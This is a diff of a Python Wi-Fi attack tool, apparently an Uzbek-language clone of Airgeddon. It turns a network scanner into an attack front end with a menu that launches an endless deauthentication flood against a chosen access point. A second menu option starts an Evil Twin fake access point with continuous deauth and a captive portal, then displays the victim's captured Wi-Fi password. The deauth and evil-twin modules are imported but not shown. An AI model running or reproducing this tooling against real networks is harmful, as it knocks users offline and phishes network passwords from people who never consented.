@@ -1,497 +1,766 @@
+#!/usr/bin/env python3
+"""
+WlanAbz — O'zbekcha Airgeddon
+UI: o'zbek menyu · natijalar sahifasi toza · logo o'zgarmaydi
+"""
+
+from __future__ import annotations
+
+import glob
 import os
 import re
-import shutil
 import subprocess
 import sys
 import threading
 import time
 
+import wifi_util as wu
 
-def check_root():
-    """Skript root (sudo) huquqi bilan ishga tushirilganini tekshirish."""
-    if os.geteuid() != 0:
-        print("[-] Root (sudo) huquqi talab qilinadi.")
-        print(f"    Sudo bilan ishga tushiring: sudo {sys.executable} {' '.join(sys.argv)}")
-        sys.exit(1)
-
-
-def auto_install_dependencies():
-    """Kerakli paketlarni (scapy, rich, aircrack-ng) avtomatik o'rnatish."""
-    apt_packages = []
-
-    if shutil.which("airmon-ng") is None:
-        apt_packages.append("aircrack-ng")
-
-    try:
-        import scapy
-    except ImportError:
-        apt_packages.append("python3-scapy")
-
-    try:
-        import rich
-    except ImportError:
-        try:
-            subprocess.run(
-                [sys.executable, "-m", "pip", "install", "rich"],
-                check=True,
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL,
-            )
-        except Exception:
-            apt_packages.append("python3-rich")
-
-    if apt_packages:
-        try:
-            subprocess.run(
-                ["apt", "update", "-y"],
-                check=True,
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL,
-            )
-            subprocess.run(
-                ["apt", "install", "-y"] + apt_packages,
-                check=True,
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL,
-            )
-        except Exception:
-            pass
-
-
-check_root()
-auto_install_dependencies()
+wu.require_root()
+print("[*] Paketlar tekshirilmoqda...")
+wu.ensure_dependencies(log=lambda m: print(f"  {m}") if m else None)
 
 from rich.console import Console
 from rich.live import Live
-from rich.panel import Panel
 from rich.table import Table
-from scapy.all import Dot11, Dot11Beacon, Dot11Elt, sniff
+from rich import box
 
-console = Console()
+from deauth_engine import run_infinite_deauth
+from eviltwin import EvilTwin
+
+console = Console(highlight=False)
+
 networks = {}
-stop_channel_hop = False
+current_mon_iface = None
+current_station_iface = None
+_active_evil_twin = None
 
-# 2.4GHz va 5GHz chastota kanallari ro'yxati
-CHANNELS_2_4GHZ = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13]
-CHANNELS_5GHZ = [
-    36, 40, 44, 48, 52, 56, 60, 64, 
-    100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 
-    149, 153, 157, 161, 165
-]
-ALL_CHANNELS = CHANNELS_2_4GHZ + CHANNELS_5GHZ
+# ═══════════════════════════════════════════════════════
+#  LOGO (o'zgartirilmaydi)
+# ═══════════════════════════════════════════════════════
 
-
-def print_banner():
-    """WlanAbz ASCII bannerini chiqarish."""
-    os.system("clear" if os.name == "posix" else "cls")
-
-    banner_art = r"""
- __        ___                _   _         
- \ \      / / | __ _ _ __    / \ | |__ ____ 
+BANNER = r"""
+ __        ___                _    _         
+ \ \      / / | __ _ _ __    / \  | |__ ____ 
   \ \ /\ / /| |/ _` | '_ \  / _ \ | '_ \_  / 
    \ V  V / | | (_| | | | |/ ___ \| |_) / /  
     \_/\_/  |_|\__,_|_| |_/_/   \_\_.__/___| 
 """
 
-    console.print(f"[cyan][bold]{banner_art}[/bold][/cyan]")
-    console.print("[bold green]" + "=" * 57 + "[/bold green]")
+
+def clear():
+    os.system("clear" if os.name == "posix" else "cls")
+
+
+def print_logo():
+    console.print(f"[bold bright_cyan]{BANNER}[/bold bright_cyan]")
+    console.print("[bold green]" + ("=" * 57) + "[/bold green]")
+    dist = wu.detect_distro().upper()
     console.print(
-        "[bold green]   Wi-Fi Dual-Band Scanner & Security Tool by WlanAbz  [/bold green]"
+        f"[bold green]   Wi-Fi Dual-Band Tool by WlanAbz  ·  {dist}[/bold green]"
     )
-    console.print("[bold green]" + "=" * 57 + "\n[/bold green]")
+    console.print("[bold green]" + ("=" * 57) + "[/bold green]\n")
 
 
-def channel_hopper(monitor_iface):
-    """2.4GHz va 5GHz kanallari bo'ylab navbatma-navbat sakrash."""
-    global stop_channel_hop
-    idx = 0
-    while not stop_channel_hop:
-        try:
-            channel = ALL_CHANNELS[idx % len(ALL_CHANNELS)]
-            subprocess.run(
-                ["iw", "dev", monitor_iface, "set", "channel", str(channel)],
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL,
-            )
-            idx += 1
-            time.sleep(0.2)
-        except Exception:
-            break
+# ═══════════════════════════════════════════════════════
+#  UI — sodda, o'zbekcha
+# ═══════════════════════════════════════════════════════
+
+def page(title: str = "", logo: bool = True):
+    """Oddiy sahifa. logo=False → faqat kontent (natijalar uchun)."""
+    clear()
+    if logo:
+        print_logo()
+    if title:
+        console.print(f"[bold white]{title}[/bold white]")
+        console.print(f"[bright_black]{'─' * 48}[/bright_black]\n")
 
 
-def set_interface_channel(monitor_iface, target_channel):
-    """Interfeysni aniq bir kanalga majburiy sozlash."""
+def sep():
+    console.print(f"[bright_black]{'─' * 48}[/bright_black]")
+
+
+def ask(prompt: str = "Tanlov") -> str:
     try:
-        subprocess.run(
-            ["iw", "dev", monitor_iface, "set", "channel", str(target_channel)],
-            check=True,
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
-        )
-        return True
-    except Exception as e:
-        console.print(f"[bold red][-] Kanalni sozlashda xatolik ({target_channel}): {e}[/bold red]")
-        return False
+        return console.input(f"\n[bold cyan]  {prompt}: [/bold cyan]").strip()
+    except (KeyboardInterrupt, EOFError):
+        return ""
 
 
-def get_wifi_interfaces():
-    """Mavjud Wi-Fi interfeyslarini aniqlash."""
-    interfaces = []
+def pause(msg: str = "Davom etish uchun Enter"):
     try:
-        output = subprocess.check_output(
-            ["ip", "-o", "link", "show"], text=True
-        )
-        for line in output.splitlines():
-            match = re.search(r"^\d+:\s+([w][l][a-z0-9]+|[a-z0-9]+mon):", line)
-            if match:
-                iface = match.group(1)
-                if iface not in interfaces:
-                    interfaces.append(iface)
-    except Exception:
+        console.input(f"\n[bright_black]  {msg}...[/bright_black] ")
+    except (KeyboardInterrupt, EOFError):
         pass
-    return interfaces
 
 
-def enable_monitor_mode():
-    """Wi-Fi kartani Monitoring rejimiga o'tkazish."""
-    wifi_interfaces = get_wifi_interfaces()
+def ok(msg: str):
+    console.print(f"[green]  [+] {msg}[/green]")
 
-    if not wifi_interfaces:
-        console.print("[bold red][-] Wi-Fi interfeysi topilmadi.[/bold red]")
+
+def err(msg: str):
+    console.print(f"[red]  [-] {msg}[/red]")
+
+
+def warn(msg: str):
+    console.print(f"[yellow]  [!] {msg}[/yellow]")
+
+
+def _log(msg: str):
+    console.print(f"[bright_black]  {msg}[/bright_black]")
+
+
+def item(num: str, text: str, color: str = "cyan"):
+    console.print(f"  [bold {color}]{num}[/bold {color}]   {text}")
+
+
+def restore_all():
+    global _active_evil_twin, current_mon_iface
+    if _active_evil_twin is not None:
+        try:
+            _active_evil_twin.stop()
+        except Exception:
+            pass
+        _active_evil_twin = None
+    iface = current_mon_iface or current_station_iface
+    page("Tarmoq tiklanmoqda")
+    wu.airmon_stop(iface, log=_log)
+    current_mon_iface = None
+    ok("Tarmoq tiklandi")
+
+
+# ═══════════════════════════════════════════════════════
+#  MONITOR
+# ═══════════════════════════════════════════════════════
+
+def pick_and_enable_monitor():
+    global current_mon_iface, current_station_iface
+
+    page("Interfeys")
+
+    ifaces = wu.list_wifi_ifaces(include_mon=True)
+    stations = []
+    for i in ifaces:
+        if i.endswith("mon") or wu.iface_type(i) == "monitor":
+            s = wu.mon_to_managed(i, log=lambda *_: None)
+            if s and s not in stations:
+                stations.append(s)
+        elif i not in stations:
+            stations.append(i)
+    if not stations:
+        stations = wu.list_wifi_ifaces(include_mon=False)
+    if not stations:
+        err("Wi-Fi interfeys topilmadi")
+        pause()
         return None
 
-    if len(wifi_interfaces) == 1:
-        target_iface = wifi_interfaces[0]
+    if len(stations) == 1:
+        target = stations[0]
+        ok(f"Interfeys: {target}")
     else:
-        console.print(
-            "\n[bold cyan]--- Mavjud Wi-Fi Interfeyslari ---[/bold cyan]"
-        )
-        for idx, iface in enumerate(wifi_interfaces, 1):
-            console.print(f" {idx}) {iface}")
-        choice = input("\n[?] Interfeys raqamini kiriting: ").strip()
+        console.print("  Mavjud kartalar:\n")
+        for idx, n in enumerate(stations, 1):
+            item(str(idx), f"{n}  ({wu.iface_type(n)})")
         try:
-            target_iface = wifi_interfaces[int(choice) - 1]
+            target = stations[int(ask("Raqam")) - 1]
         except (ValueError, IndexError):
-            console.print("[bold red][-] Noto'g'ri tanlov.[/bold red]")
+            err("Noto'g'ri tanlov")
+            pause()
             return None
 
-    subprocess.run(
-        ["airmon-ng", "check", "kill"],
-        stdout=subprocess.DEVNULL,
-        stderr=subprocess.DEVNULL,
-    )
-
-    try:
-        subprocess.run(
-            ["airmon-ng", "start", target_iface],
-            check=True,
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
-        )
-
-        updated_interfaces = get_wifi_interfaces()
-        monitor_iface = target_iface
-
-        for iface in updated_interfaces:
-            if iface.endswith("mon") or iface == target_iface:
-                monitor_iface = iface
-                break
-
-        console.print(
-            f"[bold green][+][/bold green] Monitoring rejimi yoqildi:"
-            f" [cyan]'{monitor_iface}'[/cyan]\n"
-        )
-        return monitor_iface
-    except subprocess.CalledProcessError:
-        console.print(
-            "[bold red][-] Monitoring rejimiga o'tkazishda xatolik.[/bold red]"
-        )
+    current_station_iface = target
+    console.print()
+    console.print(f"  Monitor yoqilmoqda: [cyan]{target}[/cyan] ...\n")
+    mon = wu.airmon_start(target, log=_log)
+    if not mon or wu.iface_type(mon) != "monitor":
+        err("Monitor yoqilmadi")
+        console.print(f"  sudo airmon-ng start {target}")
+        pause()
         return None
 
+    current_mon_iface = mon
+    wu.set_txpower_max(mon, log=lambda *_: None)
+    ok(f"Monitor: {mon}")
+    time.sleep(0.4)
+    return mon
 
-def packet_handler(pkt):
-    """Beacon paketlarini tutish va tahlil qilish."""
-    if pkt.haslayer(Dot11Beacon):
+
+# ═══════════════════════════════════════════════════════
+#  SKANER
+# ═══════════════════════════════════════════════════════
+
+def clean_ssid(ssid) -> str:
+    s = (ssid or "").strip().strip('"').strip("'")
+    while s.endswith(","):
+        s = s[:-1].rstrip()
+    return s.strip() or "<Yashirin>"
+
+
+def _merge_network(bssid, ssid, channel, signal, crypto):
+    if not bssid:
+        return
+    bssid = bssid.upper().strip()
+    try:
+        ch_int = int(channel)
+    except (TypeError, ValueError):
+        ch_int = channel
+    try:
+        sig = int(signal)
+    except (TypeError, ValueError):
+        sig = -100
+    if sig > 0:
+        sig = -sig
+    band = "5 GHz" if isinstance(ch_int, int) and ch_int > 14 else "2.4 GHz"
+    ssid = clean_ssid(ssid)
+    prev = networks.get(bssid)
+    if prev and prev.get("signal", -999) > sig:
+        sig = prev["signal"]
+        if str(ssid).startswith("<"):
+            ssid = prev["ssid"]
+    networks[bssid] = {
+        "ssid": ssid,
+        "channel": ch_int,
+        "signal": sig,
+        "crypto": str(crypto or "?"),
+        "band": band,
+    }
+
+
+def results_table():
+    """Faqat natijalar — sodda jadval."""
+    t = Table(
+        show_header=True,
+        header_style="bold white",
+        expand=True,
+        box=box.SIMPLE_HEAD,
+        pad_edge=False,
+        show_edge=False,
+        padding=(0, 1),
+    )
+    t.add_column("№", style="bold", width=3, justify="right")
+    t.add_column("Wi-Fi nomi", style="bold cyan", min_width=14)
+    t.add_column("MAC", style="yellow")
+    t.add_column("Kanal", style="green", justify="center", width=5)
+    t.add_column("Diapazon", style="blue", justify="center", width=7)
+    t.add_column("Signal", justify="right", width=6)
+    t.add_column("Himoya", style="magenta")
+
+    for idx, (bssid, info) in enumerate(
+        sorted(networks.items(), key=lambda x: x[1]["signal"], reverse=True), 1
+    ):
+        s = info["signal"]
+        sc = "green" if s >= -60 else ("yellow" if s >= -75 else "red")
+        t.add_row(
+            str(idx),
+            str(info["ssid"])[:22],
+            bssid,
+            str(info["channel"]),
+            info["band"],
+            f"[{sc}]{s}[/{sc}]",
+            str(info["crypto"])[:14],
+        )
+    return t
+
+
+def live_table(time_left, mode="scan"):
+    t = Table(
+        title=f"Skaner · {len(networks)} ta · {time_left}s",
+        show_header=True,
+        header_style="bold cyan",
+        expand=True,
+        show_edge=False,
+        box=box.SIMPLE,
+    )
+    t.add_column("№", width=3)
+    t.add_column("Wi-Fi", min_width=12)
+    t.add_column("MAC", style="yellow")
+    t.add_column("CH", width=4)
+    t.add_column("PWR", width=5)
+    for idx, (bssid, info) in enumerate(
+        sorted(networks.items(), key=lambda x: x[1]["signal"], reverse=True), 1
+    ):
+        t.add_row(
+            str(idx),
+            str(info["ssid"])[:18],
+            bssid,
+            str(info["channel"]),
+            str(info["signal"]),
+        )
+    return t
+
+
+def _parse_airodump_csv(csv_path: str) -> int:
+    if not os.path.isfile(csv_path):
+        return 0
+    try:
+        with open(csv_path, "r", encoding="utf-8", errors="ignore") as f:
+            raw = f.read()
+    except Exception:
+        return 0
+    ap_block = re.split(r"\n\s*\n", raw)[0]
+    added = 0
+    for line in ap_block.splitlines():
+        line = line.strip()
+        if not line or line.lower().startswith("bssid"):
+            continue
+        parts = [p.strip() for p in line.split(",")]
+        if len(parts) < 14:
+            continue
+        bssid = parts[0]
+        if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", bssid):
+            continue
+        try:
+            channel = int(parts[3])
+        except ValueError:
+            channel = parts[3]
+        try:
+            power = int(parts[8])
+        except ValueError:
+            power = -100
+        essid = parts[13].strip().strip('"') if len(parts) > 13 else ""
+        try:
+            id_len = int(parts[12])
+            if id_len == 0:
+                essid = ""
+            elif 0 < id_len < len(essid):
+                essid = essid[:id_len]
+        except (ValueError, IndexError):
+            pass
+        crypto = " ".join(x for x in (parts[5], parts[6], parts[7]) if x)
+        _merge_network(bssid, essid, channel, power, crypto)
+        added += 1
+    return added
+
+
+def _stop_airodump():
+    wu.run(["pkill", "-x", "airodump-ng"])
+    time.sleep(0.35)
+
+
+def scan_airodump(mon_iface: str, seconds: int = 30) -> int:
+    if not wu.which("airodump-ng"):
+        err("airodump-ng yo'q")
+        return 0
+
+    if wu.iface_type(mon_iface) != "monitor":
+        mon2 = wu.airmon_start(wu.base_name(mon_iface), log=lambda *_: None)
+        if mon2:
+            mon_iface = mon2
+        if wu.iface_type(mon_iface) != "monitor":
+            err("Monitor yo'q")
+            return 0
+
+    prefix = f"/tmp/wlanabz_scan_{os.getpid()}"
+    for p in glob.glob(prefix + "*"):
+        try:
+            os.remove(p)
+        except Exception:
+            pass
+    csv_path = prefix + "-01.csv"
+
+    dump_cmd = (
+        f"airodump-ng --write {prefix} --output-format csv "
+        f"--write-interval 1 --band abg {mon_iface}"
+    )
+
+    page("Skaner")
+    console.print(f"  Interfeys: [cyan]{mon_iface}[/cyan]")
+    console.print("  O'ngda airodump oynasi ochiladi.")
+    console.print("  Tarmoqlarni ko'rib, shu yerda Enter bosing.\n")
+
+    term_proc = wu.open_side_terminal(
+        title=f"airodump · {mon_iface}",
+        command=dump_cmd,
+        log=_log,
+        geometry="105x34-16+48",
+    )
+
+    if term_proc is None:
+        warn("Yon oyna ochilmadi — shu terminalda skaner")
+        return _scan_airodump_inline(mon_iface, prefix, csv_path, seconds)
+
+    ok("Skaner ishlayapti (yon oyna)")
+    try:
+        ask("To'xtatish uchun Enter")
+    except KeyboardInterrupt:
+        pass
+    finally:
+        _stop_airodump()
+        if term_proc and term_proc.poll() is None:
+            try:
+                term_proc.terminate()
+            except Exception:
+                pass
+            try:
+                os.killpg(os.getpgid(term_proc.pid), 15)
+            except Exception:
+                try:
+                    term_proc.kill()
+                except Exception:
+                    pass
+        time.sleep(0.5)
+        for p in glob.glob(prefix + "*"):
+            if p.endswith(".csv"):
+                _parse_airodump_csv(p)
+            try:
+                os.remove(p)
+            except Exception:
+                pass
+
+    return len(networks)
+
+
+def _scan_airodump_inline(mon_iface, prefix, csv_path, seconds) -> int:
+    err_f = open(prefix + ".err", "w")
+    try:
+        proc = subprocess.Popen(
+            [
+                "airodump-ng", "--write", prefix,
+                "--output-format", "csv", "--write-interval", "1",
+                "--band", "abg", mon_iface,
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=err_f,
+        )
+    except Exception as e:
+        err_f.close()
+        err(str(e))
+        return 0
+    t0 = time.time()
+    try:
+        with Live(live_table(seconds), refresh_per_second=2, console=console) as live:
+            while time.time() - t0 < seconds:
+                if proc.poll() is not None:
+                    break
+                _parse_airodump_csv(csv_path)
+                live.update(live_table(max(0, int(seconds - (time.time() - t0)))))
+                time.sleep(0.4)
+    except KeyboardInterrupt:
+        pass
+    finally:
+        if proc.poll() is None:
+            proc.terminate()
+            try:
+                proc.wait(timeout=2)
+            except Exception:
+                proc.kill()
+        err_f.close()
+        time.sleep(0.3)
+        _parse_airodump_csv(csv_path)
+        for p in glob.glob(prefix + "*"):
+            try:
+                os.remove(p)
+            except Exception:
+                pass
+    return len(networks)
+
+
+def scan_scapy(mon_iface: str, seconds: int = 16) -> int:
+    before = len(networks)
+    try:
+        from scapy.all import Dot11, Dot11Beacon, Dot11Elt, sniff, conf
+        conf.iface = mon_iface
+    except Exception as e:
+        warn(f"scapy: {e}")
+        return 0
+
+    stop = threading.Event()
+    hops = list(wu.CHANNELS_2_4) + list(wu.CHANNELS_5)
+
+    def hopper():
+        i = 0
+        while not stop.is_set():
+            wu.set_channel(mon_iface, hops[i % len(hops)], force_raw=True)
+            i += 1
+            stop.wait(0.25)
+
+    def on_pkt(pkt):
+        if not pkt.haslayer(Dot11Beacon):
+            return
         bssid = pkt[Dot11].addr2
         try:
             ssid = pkt[Dot11Elt].info.decode("utf-8", errors="ignore")
         except Exception:
             ssid = ""
-
-        if not ssid:
-            ssid = "<Yashirin Tarmoq (Hidden)>"
-
-        dbm_signal = pkt.dBm_AntSignal if hasattr(pkt, "dBm_AntSignal") else -100
-
+        dbm = getattr(pkt, "dBm_AntSignal", -100)
         try:
-            stats = pkt[Dot11Beacon].network_stats()
-            channel = stats.get("channel", "Noma'lum")
-            crypto = stats.get("crypto", "Noma'lum")
+            st = pkt[Dot11Beacon].network_stats()
+            ch, crypto = st.get("channel", "?"), st.get("crypto", "?")
         except Exception:
-            channel = "Noma'lum"
-            crypto = "Noma'lum"
+            ch, crypto = "?", "?"
+        _merge_network(bssid, ssid, ch, dbm, crypto)
 
-        freq_band = "5 GHz" if isinstance(channel, int) and channel > 14 else "2.4 GHz"
-
-        networks[bssid] = {
-            "ssid": ssid,
-            "channel": channel,
-            "signal": dbm_signal,
-            "crypto": str(crypto),
-            "band": freq_band
-        }
-
-
-def generate_live_table(time_left):
-    """Real vaqtda yangilanadigan jadval interfeysi."""
-    title_str = (
-        f"[bold green]WlanAbz - DUAL-BAND SKANERLASH[/bold green] | Topildi:"
-        f" [bold cyan]{len(networks)}[/bold cyan] ta | Qolgan vaqt: [bold"
-        f" yellow]{time_left} soniya[/bold yellow]"
+    threading.Thread(target=hopper, daemon=True).start()
+    th = threading.Thread(
+        target=lambda: sniff(iface=mon_iface, prn=on_pkt, timeout=seconds, store=False),
+        daemon=True,
     )
-
-    table = Table(
-        title=title_str,
-        show_header=True,
-        header_style="bold magenta",
-        expand=True,
-    )
-    table.add_column("№", style="dim", width=4, justify="center")
-    table.add_column("SSID (Wi-Fi Nomi)", style="bold cyan", min_width=18)
-    table.add_column("BSSID (MAC Manzil)", style="yellow", justify="center")
-    table.add_column("Chastota", style="blue", justify="center")
-    table.add_column("Kanal", style="green", justify="center")
-    table.add_column("Signal (dBm)", justify="center")
-
-    sorted_networks = sorted(
-        networks.items(), key=lambda x: x[1]["signal"], reverse=True
-    )
-
-    for idx, (bssid, info) in enumerate(sorted_networks, 1):
-        sig = info["signal"]
-        if sig >= -60:
-            sig_str = f"[bold green]{sig} dBm[/bold green]"
-        elif sig >= -75:
-            sig_str = f"[bold yellow]{sig} dBm[/bold yellow]"
-        else:
-            sig_str = f"[bold red]{sig} dBm[/bold red]"
-
-        table.add_row(
-            str(idx),
-            info["ssid"][:25],
-            bssid,
-            info["band"],
-            str(info["channel"]),
-            sig_str,
-        )
-
-    return table
+    th.start()
+    t0 = time.time()
+    try:
+        with Live(live_table(seconds, "scapy"), refresh_per_second=3, console=console) as live:
+            while time.time() - t0 < seconds and th.is_alive():
+                live.update(live_table(max(0, int(seconds - (time.time() - t0))), "scapy"))
+                time.sleep(0.3)
+    except KeyboardInterrupt:
+        pass
+    stop.set()
+    th.join(timeout=2)
+    return len(networks) - before
 
 
-def scan_wifi_networks(monitor_iface):
-    """Skanerlash vaqtini 35 soniya qilib, 2.4/5GHz kanallarni skanerlash."""
-    global stop_channel_hop, networks
+def scan_networks(mon_iface: str, seconds: int = 32):
+    global networks
     networks.clear()
-    stop_channel_hop = False
 
-    total_scan_time = 35
+    if wu.iface_type(mon_iface) != "monitor":
+        mon2 = wu.airmon_start(wu.base_name(mon_iface), log=lambda *_: None)
+        if mon2:
+            mon_iface = mon2
 
-    hop_thread = threading.Thread(
-        target=channel_hopper, args=(monitor_iface,), daemon=True
-    )
-    hop_thread.start()
+    wu.run(["rfkill", "unblock", "all"])
+    wu.run(["iw", "reg", "set", "US"])
+    wu.set_channel(mon_iface, 6, force_raw=True)
 
-    def sniff_worker():
-        try:
-            sniff(
-                iface=monitor_iface, prn=packet_handler, timeout=total_scan_time
-            )
-        except Exception:
-            pass
+    scan_airodump(mon_iface, seconds=max(22, seconds - 4))
+    if not networks:
+        page("Qayta urinish")
+        warn("Tarmoq topilmadi — boshqa usul bilan...")
+        scan_scapy(mon_iface, 16)
 
-    sniff_thread = threading.Thread(target=sniff_worker, daemon=True)
-    sniff_thread.start()
+    return mon_iface
 
-    start_time = time.time()
 
-    with Live(
-        generate_live_table(total_scan_time),
-        refresh_per_second=4,
-        console=console,
-    ) as live:
-        while True:
-            elapsed = time.time() - start_time
-            time_left = max(0, int(total_scan_time - elapsed))
+def show_results_and_pick(mon_iface):
+    """
+    FAQAT NATIJALAR — logo yo'q, ortiqcha status yo'q.
+    """
+    clear()  # toza ekran, logo yo'q
 
-            live.update(generate_live_table(time_left))
+    if not networks:
+        err("Tarmoq topilmadi")
+        pause()
+        return None
 
-            if time_left <= 0 or not sniff_thread.is_alive():
-                break
-            time.sleep(0.25)
-
-    stop_channel_hop = True
+    # faqat jadval
+    console.print()
+    console.print(results_table())
+    console.print()
     console.print(
-        f"\n[bold green][+][/bold green] Skanerlash yakunlandi. Jami:"
-        f" [bold cyan]{len(networks)}[/bold cyan] ta tarmoq topildi.\n"
+        f"  [bright_black]Jami: {len(networks)} ta  ·  "
+        f"raqam = tanlash  ·  r = qayta  ·  0 = chiqish[/bright_black]"
     )
+    raw = ask("Tarmoq raqami")
+
+    if raw.lower() == "r":
+        mon_iface = scan_networks(mon_iface, 28)
+        return show_results_and_pick(mon_iface)
+    if raw == "0":
+        restore_all()
+        return None
+
+    sorted_n = sorted(networks.items(), key=lambda x: x[1]["signal"], reverse=True)
+    try:
+        item = sorted_n[int(raw) - 1]
+        return target_menu(item[0], item[1], mon_iface)
+    except (ValueError, IndexError):
+        err("Noto'g'ri raqam")
+        pause()
+        return show_results_and_pick(mon_iface)
 
 
-def show_selected_target_menu(target_bssid, target_info, monitor_iface):
-    """Tanlangan tarmoqning xavfsizlik va xarakteristika tahlili."""
-    print_banner()
+# ═══════════════════════════════════════════════════════
+#  HUJUM
+# ═══════════════════════════════════════════════════════
 
-    details = (
-        f"[bold white]SSID (Tarmoq Nomi):[/bold white] [cyan]{target_info['ssid']}[/cyan]\n"
-        f"[bold white]BSSID (MAC Manzil):[/bold white] [yellow]{target_bssid}[/yellow]\n"
-        f"[bold white]Diapazon (Chastota):[/bold white] [blue]{target_info['band']}[/blue]\n"
-        f"[bold white]Ishchi Kanal (CH):[/bold white] [green]{target_info['channel']}[/green]\n"
-        f"[bold white]Signal Darajasi:[/bold white] [magenta]{target_info['signal']} dBm[/magenta]\n"
-        f"[bold white]Himoya Turi:[/bold white] [blue]{target_info['crypto']}[/blue]"
+def target_menu(bssid, info, mon_iface):
+    page("Tanlangan tarmoq")
+
+    console.print(f"  Wi-Fi nomi   [bold cyan]{info['ssid']}[/bold cyan]")
+    console.print(f"  MAC          [yellow]{bssid}[/yellow]")
+    console.print(
+        f"  Kanal        [green]{info['channel']}[/green]  "
+        f"[blue]{info['band']}[/blue]"
     )
+    console.print(f"  Signal       [magenta]{info['signal']} dBm[/magenta]")
+    console.print(f"  Himoya       {info['crypto']}")
+    console.print()
+    sep()
+    console.print()
+    item("1", "Uzish (Deauth)", "red")
+    item("2", "Soxta Wi-Fi (Evil Twin)", "yellow")
+    item("3", "Qayta skaner", "cyan")
+    item("4", "Bosh menyu", "green")
+    item("0", "Chiqish", "white")
 
-    panel = Panel(
-        details,
-        title="[bold cyan]TANLANGAN TARMOQ MA'LUMOTLARI[/bold cyan]",
-        border_style="green",
-    )
-    console.print(panel)
+    c = ask("Tanlov")
 
-    action_panel = Panel(
-        "  [bold yellow]1[/bold yellow] -> Tarmoq xavfsizligini audit qilish (WPA3 / PMF Check)\n"
-        "  [bold green]2[/bold green] -> Bosh menyuga qaytish\n"
-        "  [bold red]0[/bold red] -> Dasturdan chiqish",
-        title="[bold cyan]HARAKATNI TANLANG[/bold cyan]",
-        border_style="cyan",
-    )
-    console.print(action_panel)
+    if c == "1":
+        try:
+            ch = int(info["channel"])
+        except (TypeError, ValueError):
+            ch = 6
+        page("Uzish (Deauth)")
+        console.print(f"  MAC: [yellow]{bssid}[/yellow]")
+        console.print(f"  Kanal: [green]{ch}[/green]")
+        console.print("  To'xtatish: Ctrl+C\n")
+        wu.set_channel(mon_iface, ch, force_raw=True)
+        try:
+            run_infinite_deauth(mon_iface, bssid, channel=ch, log=_log)
+        except KeyboardInterrupt:
+            pass
+        ok("To'xtatildi")
+        pause()
+        return target_menu(bssid, info, mon_iface)
 
-    choice = input("\n[?] Tanlovingizni kiriting (1/2/0): ").strip()
+    if c == "2":
+        run_evil_twin(bssid, info, mon_iface)
+        global current_mon_iface, current_station_iface
+        st = wu.resolve_station(current_station_iface or mon_iface, log=lambda *_: None)
+        if st:
+            current_station_iface = st
+            m = wu.airmon_start(st, log=_log)
+            if m:
+                current_mon_iface = m
+                mon_iface = m
+        return target_menu(bssid, info, mon_iface)
 
-    if choice == "1":
-        console.print(
-            "\n[bold cyan][*] Tarmoq xavfsizligi va PMF (802.11w) tahlil qilinmoqda...[/bold cyan]"
-        )
-        time.sleep(1)
+    if c == "3":
+        mon_iface = scan_networks(mon_iface, 28)
+        return show_results_and_pick(mon_iface)
 
-        # 1. Adaptor kanalini majburiy ravishda target router kanaliga moslashtirish
-        target_channel = target_info["channel"]
-        if isinstance(target_channel, int):
-            console.print(f"[bold cyan][*] Wi-Fi kartasi {target_channel}-kanalga o'tkazilmoqda...[/bold cyan]")
-            set_interface_channel(monitor_iface, target_channel)
+    if c == "4":
+        restore_all()
+        pause()
+        return main()
 
-        if "WPA3" in target_info["crypto"]:
-            console.print(
-                "[bold green][+] Tarmoq WPA3 va PMF bilan himoyalangan."
-                " Boshqaruv kadrlari shifrlangan.[/bold green]"
-            )
-        else:
-            # 2. Aireplay-ng uchun to'g'ri chaqiriq
-            cmd = ["aireplay-ng", "--deauth", "10", "-a", target_bssid, monitor_iface]
-            try:
-                subprocess.run(cmd)
-            except Exception as e:
-                console.print(f"[bold red][-] Xatolik: {e}[/bold red]")
-
-            console.print(
-                "[bold yellow][!] Tarmoq WPA2 protokolidan foydalanmoqda."
-                " Tavsiya: Router sozlamalarida PMF (802.11w) rejimini yoqing.[/bold yellow]"
-            )
-        input("\n[Davom etish uchun Enter bosing...]")
-        show_selected_target_menu(target_bssid, target_info, monitor_iface)
-    elif choice == "2":
-        restore_network(monitor_iface)
-        main()
-    elif choice == "0":
-        restore_network(monitor_iface)
-        console.print(
-            "\n[bold yellow][!] Dastur yakunlandi. Xayr![/bold yellow]"
-        )
+    if c == "0":
+        restore_all()
+        console.print("\n  Xayr!\n")
         sys.exit(0)
+
+    return target_menu(bssid, info, mon_iface)
+
+
+def run_evil_twin(bssid, info, mon_iface):
+    global _active_evil_twin
+    essid = clean_ssid(info.get("ssid") or "Wi-Fi")
+    if essid.startswith("<") or not essid:
+        essid = "Wi-Fi"
+    try:
+        real_ch = int(info.get("channel") or 6)
+    except (TypeError, ValueError):
+        real_ch = 6
+    ap_ch = wu.normalize_channel(real_ch)
+
+    page("Soxta Wi-Fi")
+    console.print(f"  Wi-Fi nomi   [bold cyan]{essid}[/bold cyan]")
+    console.print(f"  MAC          [yellow]{bssid}[/yellow]")
+    console.print(f"  AP kanal     [green]{ap_ch}[/green]")
+    console.print(f"  Uzish kanal  [green]{real_ch}[/green]")
+    console.print(f"  Portal       http://192.168.1.1/")
+    console.print()
+    console.print("  1) Telefonda haqiqiy Wi-Fi ni unuting")
+    console.print("  2) Ochiq (parolsiz) tarmoqqa ulaning")
+    console.print("  3) Ctrl+C — to'xtatish")
+    console.print()
+
+    twin = EvilTwin(log_callback=_log)
+    _active_evil_twin = twin
+    try:
+        result = twin.run(
+            mon_iface=mon_iface,
+            essid=essid,
+            bssid=bssid,
+            channel=ap_ch,
+            deauth_channel=real_ch,
+            timeout=0,
+            continuous_deauth=True,
+            ap_essid=essid,
+        )
+    except KeyboardInterrupt:
+        twin.stop()
+        result = {"success": False}
+    except Exception as e:
+        twin.stop()
+        result = {"success": False, "error": str(e)}
+    finally:
+        _active_evil_twin = None
+
+    page("Natija")
+    if result.get("success") and result.get("password"):
+        ok(f"Parol: {result['password']}")
+        if result.get("file"):
+            console.print(f"  Fayl: {result['file']}")
